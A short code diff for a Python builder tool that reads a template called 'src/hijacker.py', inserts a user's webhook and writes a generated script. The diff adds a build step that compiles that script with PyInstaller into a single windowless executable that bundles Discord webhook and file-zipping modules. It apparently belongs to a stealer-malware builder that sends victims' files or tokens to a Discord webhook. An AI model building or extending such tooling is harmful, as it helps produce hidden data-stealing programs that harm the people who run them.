@@ -1,4 +1,5 @@
 import sys
+import os
 
 def create_python_file(hook):
     with open('src/hijacker.py', 'r', encoding='utf-8') as f1:
@@ -33,9 +34,11 @@ def main():
     user_option = int(input("[Choose option]: "))
     
     if user_option == 1:
-        create_python_file(hook)
-        print("   File 'generated_file.py' generated!")
+        create_python_file(hook) #относитсься к if
+        print("   File 'generated_file.py' generated!") #относитсься к if
     if user_option == 2:
+        os.system("pip install -r requirements.txt")
+        os.system("pyinstaller --onefile --noconsole --hidden-import discord_webhook --hidden-import zip_files --hidden-import shutil generated_file.py")
         print("   Coming soon!")
 
 def set_def_color():
